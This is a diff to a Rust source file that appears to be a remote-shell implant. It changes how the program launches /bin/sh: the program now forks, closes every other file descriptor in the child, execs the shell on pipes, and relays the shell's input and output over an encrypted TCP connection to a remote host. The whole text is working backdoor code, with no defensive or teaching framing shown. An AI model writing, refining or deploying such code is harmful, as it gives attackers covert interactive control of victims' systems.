@@ -20,6 +20,8 @@ use rand_core::SeedableRng;
 use relay::{relay, RelayNode};
 use std::ffi::{c_char, CStr};
 use std::net::{Ipv4Addr, SocketAddr, TcpStream};
+use std::os::unix::io::AsRawFd;
+use std::os::unix::process::CommandExt;
 use std::process::Command;
 use std::str::FromStr;
 use util::debug;
@@ -128,26 +130,43 @@ pub fn main(
 		os_pipe::pipe().expect("Failed to open pipes");
 	let (pipeout_child, pipeout_parent) =
 		os_pipe::pipe().expect("Failed to open pipes");
-
-	// Exec the shell
-	let cmd = b"/bin/sh";
-	Command::new(std::str::from_utf8(&cmd[..]).unwrap())
-		.stdin(pipeout_child)
-		.stderr(
-			pipein_child.try_clone().expect("Failed to dup stderr"),
-		)
-		.stdout(pipein_child)
-		.spawn()
-		.expect("Unable to start shell.");
-	// todo!();
-
-	// Start up the relay
-	let mut node1 = RelayNode {
-		readable: pipein_parent,
-		writeable: pipeout_parent,
+	match unsafe { libc::fork() } {
+		-1 => panic!("Unable to fork"),
+		0 => {
+			// Child:
+			//  - close fds (except _child pipes) get the max fd value
+			let fdmax: i32 =
+				unsafe { libc::sysconf(libc::_SC_OPEN_MAX) }
+					.try_into()
+					.unwrap_or(i16::MAX.into());
+			//    convert to integers instead of rust files
+			let (fd0, fd1) =
+				(pipein_child.as_raw_fd(), pipeout_child.as_raw_fd());
+			//    close everything
+			for fd in 0i32..fdmax {
+				if fd != fd0 && fd != fd1 {
+					unsafe { libc::close(fd) };
+				}
+			}
+			//  - setup /bin/sh command with stdin/stderr/stdout set
+			let mut cmd = std::process::Command::new("/bin/sh");
+			cmd.stdin(pipeout_child)
+				.stderr(pipein_child.try_clone().unwrap())
+				.stdout(pipein_child);
+			//  - tty?
+			//  - exec
+			cmd.exec();
+		}
+		_ => {
+			// todo!();
+			// Start up the relay
+			let mut node1 = RelayNode {
+				readable: pipein_parent,
+				writeable: pipeout_parent,
+			};
+			relay(&mut node1, &mut remote, &key, &mut rng)
+				.expect("Finished relay");
+		}
 	};
-	relay(&mut node1, &mut remote, &key, &mut rng)
-		.expect("Finished relay");
-
 	return 0;
 }
